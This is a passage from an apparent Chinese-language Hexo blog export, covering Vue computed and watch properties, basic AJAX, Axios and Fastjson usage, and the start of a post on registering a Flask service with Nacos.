<h2 id="4-计算属性简写"><a href="#4-计算属性简写" class="headerlink" title="4. 计算属性简写"></a>4. 计算属性简写</h2><p><strong>语法：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">computed</span>:&#123;</span><br><span class="line">	计算属性名()&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>计算属性确定不考虑修改，可以使用计算属性的简写形式。</strong></p>
<hr>
<h1 id="二、监听属性"><a href="#二、监听属性" class="headerlink" title="二、监听属性"></a>二、监听属性</h1><h2 id="1-案例引入-1"><a href="#1-案例引入-1" class="headerlink" title="1. 案例引入"></a>1. 案例引入</h2><figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>监听属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>今天天气好&#123;&#123;isHot ? &#x27;炎热&#x27; : &#x27;凉爽&#x27;&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>点击切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">isHot</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">changeWeather</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>上述案例中需要根据 isHot 的值判断是否炎热，但上述方法略显草率，也许我们可以用刚才学的计算属性来试一试。</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>监听属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h1</span>&gt;</span>今天天气好&#123;&#123;info&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>点击切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">	</span></span><br><span class="line"><span class="language-javascript">	<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">isHot</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">changeWeather</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;,</span></span><br><span class="line"><span class="language-javascript">		<span class="attr">computed</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="title function_">info</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="keyword">return</span> <span class="variable language_">this</span>.<span class="property">isHot</span> ? <span class="string">&#x27;炎热&#x27;</span> : <span class="string">&#x27;凉爽&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;</span></span><br><span class="line"><span class="language-javascript">	&#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><strong>这样写也不是不可以，但是我们现在要使用更适合此处需求的方式：使用监听属性</strong></p>
<hr>
<h2 id="2-监听属性使用"><a href="#2-监听属性使用" class="headerlink" title="2. 监听属性使用"></a>2. 监听属性使用</h2><p><strong>监听属性完整语法：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">watch</span>:&#123;</span><br><span class="line">	监听属性名:&#123;</span><br><span class="line">		<span class="comment">// 当为 true 时，初始化时让 handler 调用一下，默认 false</span></span><br><span class="line">		<span class="comment">// immediate: true,</span></span><br><span class="line">		<span class="comment">// 当为 true 时，开启深度监视，默认 false</span></span><br><span class="line">		<span class="comment">// deep: true,</span></span><br><span class="line">		<span class="comment">// 当 监听属性 被修改时调用</span></span><br><span class="line">		<span class="title function_">hander</span>(<span class="params">newValue, oldValue</span>)&#123;</span><br><span class="line">		</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>监听属性<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">h1</span>&gt;</span>今天天气好&#123;&#123;info&#125;&#125;!<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">		<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;changeWeather&quot;</span>&gt;</span>点击切换天气<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">	</span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">		<span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">isHot</span>:<span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">info</span>:<span class="string">&quot;&quot;</span></span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">methods</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="title function_">changeWeather</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="variable language_">this</span>.<span class="property">isHot</span> = !<span class="variable language_">this</span>.<span class="property">isHot</span></span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;,</span></span><br><span class="line"><span class="language-javascript">			<span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">				<span class="attr">isHot</span>: &#123;</span></span><br><span class="line"><span class="language-javascript">					<span class="attr">immediate</span>: <span class="literal">true</span>,</span></span><br><span class="line"><span class="language-javascript">					<span class="title function_">handler</span>(<span class="params">newValue, oldValue</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">						<span class="variable language_">this</span>.<span class="property">info</span> = newValue ? <span class="string">&quot;炎热&quot;</span> : <span class="string">&quot;凉爽&quot;</span>;</span></span><br><span class="line"><span class="language-javascript">					&#125;</span></span><br><span class="line"><span class="language-javascript">				&#125;</span></span><br><span class="line"><span class="language-javascript">			&#125;</span></span><br><span class="line"><span class="language-javascript">		&#125;)</span></span><br><span class="line"><span class="language-javascript">	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>


<hr>
<h2 id="3-深度监听"><a href="#3-深度监听" class="headerlink" title="3. 深度监听"></a>3. 深度监听</h2><p><strong>案例引入</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;X-UA-Compatible&quot;</span> <span class="attr">content</span>=<span class="string">&quot;IE=edge&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">title</span>&gt;</span>深度监视<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;../js/vue.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;root&quot;</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>a = &#123;&#123;numbers.a&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.a++&quot;</span>&gt;</span>点我让a+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">h3</span>&gt;</span>b = &#123;&#123;numbers.b&#125;&#125;<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">button</span> @<span class="attr">click</span>=<span class="string">&quot;numbers.b++&quot;</span>&gt;</span>点我让b+1<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">new</span> <span class="title class_">Vue</span>(&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">el</span>:<span class="string">&#x27;#root&#x27;</span>,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">data</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">numbers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">a</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">        <span class="attr">b</span>:<span class="number">1</span>,</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;,</span></span><br><span class="line"><span class="language-javascript">    <span class="attr">watch</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">      <span class="attr">numbers</span>:&#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="title function_">handler</span>(<span class="params"></span>)&#123;</span></span><br><span class="line"><span class="language-javascript">          <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;numbers改变了&#x27;</span>)</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">      &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">  &#125;)</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815144645.png" alt="  "></p>
<p><strong>此案例是为了监视 numbers 中值的变化，但 a、b 都修改了，handler却没有调用。这是因为 Vue 中提供的 watch 默认不能监控多级结构属性变化，需要加上属性 <code>deep:true</code>才可。</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">watch</span>:&#123;</span><br><span class="line">	<span class="comment">//监视多级结构中所有属性的变化</span></span><br><span class="line">	<span class="attr">numbers</span>:&#123;</span><br><span class="line">		<span class="attr">deep</span>:<span class="literal">true</span>,</span><br><span class="line">		<span class="title function_">handler</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;numbers改变了&#x27;</span>)</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<blockquote>
<ul>
<li>Vue中的watch默认不监测对象内部值的改变（一层）</li>
<li>在watch中配置<code>deep:true</code>可以监测对象内部值的改变（多层）</li>
</ul>
</blockquote>
<hr>
<h2 id="4-监听属性简写"><a href="#4-监听属性简写" class="headerlink" title="4. 监听属性简写"></a>4. 监听属性简写</h2><p><strong>语法：</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="attr">watch</span>:&#123;</span><br><span class="line">	<span class="comment">// 直接将此函数当为 hanlder 用</span></span><br><span class="line">	监听属性名()&#123;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>监听属性确定不需要配置 <code>immediate</code> 以及 <code>deep</code>，可以使用监听属性的简写形式。</strong></p>
<hr>
<h1 id="三、计算属性与监听属性对比"><a href="#三、计算属性与监听属性对比" class="headerlink" title="三、计算属性与监听属性对比"></a>三、计算属性与监听属性对比</h1><ul>
<li>计算属性的依赖项的值改变后重新计算结果更新DOM，然后存入缓存</li>
<li>监听属性是监听属性值，当配置的属性值变化时调用相对应的 hanlder 函数</li>
<li>计算属性<code>不能执行异步任务</code>。计算属性一般不用来向服务器发送请求或执行异步任务，因为耗时太长。</li>
<li>最后一句话：计算属性能实现的，监听属性都能实现，计算属性不能实现的，监听属性也能实现。</li>
</ul>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>vue</tag>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>AJAX &amp; Axios &amp; JSON</title>
    <url>/posts/47d2f7a2.html</url>
    <content><![CDATA[<h1 id="AJAX"><a href="#AJAX" class="headerlink" title="AJAX"></a>AJAX</h1><ul>
<li><strong>概念：AJAX（<code>A</code>synchronous <code>J</code>avaScript <code>A</code>nd <code>X</code>ML）</strong>：一步的JavaScript和XML</li>
<li>AJAX作用：<br>① <strong>与服务器进行数据交换</strong>：通过AJAX可以给服务器发送请求，并获取服务器响应的数据。<br>② <strong>异步交互</strong>：可以在<code>不重新加载整个页面</code>的情况下，与服务器交换数据并<code>更新部分</code>网页的技术。</li>
</ul>
<h2 id="AJAX开发步骤"><a href="#AJAX开发步骤" class="headerlink" title="AJAX开发步骤"></a>AJAX开发步骤</h2><p><strong>1. 创建XMLHttpRequest对象：用于与服务器交换数据</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> xhttp;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable language_">window</span>.<span class="property">XMLHttpRequest</span>) &#123;</span><br><span class="line">	xhttp = <span class="keyword">new</span> <span class="title class_">XMLHttpRequest</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="comment">// code for IE6, IE5</span></span><br><span class="line">	xhttp = <span class="keyword">new</span> <span class="title class_">ActiveXObject</span>(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2. 向服务器发送请求</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhttp.<span class="title function_">open</span>(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;url&quot;</span>);</span><br><span class="line">xhttp.<span class="title function_">send</span>();</span><br></pre></td></tr></table></figure>

<p><strong>3.  获取服务器响应数据</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">xhttp.<span class="property">onreadystatechange</span> = <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable language_">this</span>.<span class="property">readyState</span> == <span class="number">4</span> &amp;&amp; <span class="variable language_">this</span>.<span class="property">status</span> == <span class="number">200</span>) &#123;</span><br><span class="line">		<span class="variable language_">document</span>.<span class="title function_">getElementById</span>(<span class="string">&quot;demo&quot;</span>).<span class="property">innerHTML</span> = <span class="variable language_">this</span>.<span class="property">responseText</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h1 id="Axios"><a href="#Axios" class="headerlink" title="Axios"></a>Axios</h1><blockquote>
<p><strong>- Axios对原生的AJAX进行封装，简化书写</strong></p>
</blockquote>
<h2 id="Axios开发步骤"><a href="#Axios开发步骤" class="headerlink" title="Axios开发步骤"></a>Axios开发步骤</h2><p><strong>① 引入 axios 的js文件</strong></p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!--在线引入--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;https://unpkg.com/axios/dist/axios.min.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!--引入本地文件--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;js/axios.js&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>② 使用axios发送请求，并获取响应结果</strong></p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">axios</span>(&#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;get&#x27;</span>,</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">resp</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(resp)</span><br><span class="line">  &#125;);</span><br></pre></td></tr></table></figure>

<h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><blockquote>
<ul>
<li><strong>概念：&#x3D;&#x3D;J&#x3D;&#x3D;ava&#x3D;&#x3D;S&#x3D;&#x3D;cript &#x3D;&#x3D;O&#x3D;&#x3D;bject &#x3D;&#x3D;N&#x3D;&#x3D;otation。JavaScript对象表示法</strong></li>
</ul>
</blockquote>
<p><strong>JSON由于其语法简单，层次结构鲜明，现多用于作为<code>数据载体</code>，在网络上进行数据传输。</strong></p>
<h2 id="JSON数据和JSON对象转换"><a href="#JSON数据和JSON对象转换" class="headerlink" title="JSON数据和JSON对象转换"></a>JSON数据和JSON对象转换</h2><blockquote>
<ul>
<li><code>Fastjson</code>是阿里巴巴提供的一个Java语言编写的高性能功能完善的JSON库，是目前Java语言中最快的JSON库，可以实现Java对象和JSON字符串的相互转换。</li>
</ul>
</blockquote>
<ul>
<li><strong>使用：</strong></li>
</ul>
<p><strong>①导入坐标</strong></p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.alibaba<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>fastjson<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.62<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p><strong>②Java对象转JSON字符串</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">jsonStr</span> <span class="operator">=</span> JSON.toJSONString(obj);</span><br></pre></td></tr></table></figure>
<p><strong>③JSON字符串转Java对象</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> JSON.pareObject(JsonStr, User.class);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>技术笔记</category>
      </categories>
      <tags>
        <tag>javascript</tag>
        <tag>ajax</tag>
        <tag>json</tag>
      </tags>
  </entry>
  <entry>
    <title>Flask微服务注册到Nacos</title>
    <url>/posts/5696223f.html</url>
    <content><![CDATA[<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>最近有一个使用 SpringCloud 的微服务项目，需要使用到 Flask 提供一些深度学习的模型接口。Java那边使用的 Nacos 作为注册中心，所以也需要把 Flask 的服务注册上去。</p>
<p>本文会谈到手写实现Flask服务注册到Nacos与基于<a href="https://pypi.org/project/nacos-sdk-python/">nacos-sdk-python</a>注册，以及SpringBoot调用Flask以及SpringGateway网关请求转发调用Flask。</p>
<hr>
<h1 id="二、手写实现Flask注册到Nacos"><a href="#二、手写实现Flask注册到Nacos" class="headerlink" title="二、手写实现Flask注册到Nacos"></a>二、手写实现Flask注册到Nacos</h1><h2 id="1-服务注册"><a href="#1-服务注册" class="headerlink" title="1. 服务注册"></a>1. 服务注册</h2><p><a href="https://nacos.io/zh-cn/docs/quick-start.html">Nacos官方文档</a>给出了服务注册的请求地址。<br><img src="https://tang-yt-bucket.oss-cn-chengdu.aliyuncs.com/hexo/2023/08/15/20230815130853.png" alt=" "></p>
<blockquote>
<ul>
<li><strong>请求地址：</strong><br><a href="http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=%E6%9C%8D%E5%8A%A1%E5%90%8D&ip=%E6%9C%8D%E5%8A%A1ip%E5%9C%B0%E5%9D%80&port=%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8F%A3">http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=服务名&amp;ip=服务ip地址&amp;port=服务端口</a></li>
<li><strong>请求方式</strong>：POST</li>
</ul>
</blockquote>
<p>逻辑很简单，直接给出实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 服务注册</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">service_register</span>():</span><br><span class="line">	url = <span class="string">&quot;http://127.0.0.1:8848/nacos/v1/ns/instance?serviceName=pythonservice&amp;ip=127.0.0.1&amp;port=5000&quot;</span></span><br><span class="line">	res = requests.post(url)</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&quot;完成注册&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">	service_register()</span><br><span class="line">	app.run()</span><br></pre></td></tr></table></figure>

<p>登录到Nacos的控制页面，可以看到确实已经注册上去了。</p>
